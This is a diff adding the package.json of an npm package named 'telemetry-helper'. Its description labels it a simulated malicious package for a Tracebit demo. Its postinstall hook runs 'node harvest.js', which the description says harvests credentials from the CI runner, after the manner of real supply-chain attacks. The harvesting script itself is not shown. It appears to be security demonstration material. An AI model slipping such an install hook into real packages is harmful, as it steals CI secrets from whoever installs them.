@@ -1,0 +1,9 @@
+{
+  "name": "telemetry-helper",
+  "version": "2.0.1",
+  "description": "SIMULATED MALICIOUS PACKAGE for the Tracebit demo. Its postinstall hook harvests credentials from the CI runner, like the tj-actions, Trivy and LiteLLM supply-chain attacks.",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node harvest.js"
+  }
+}
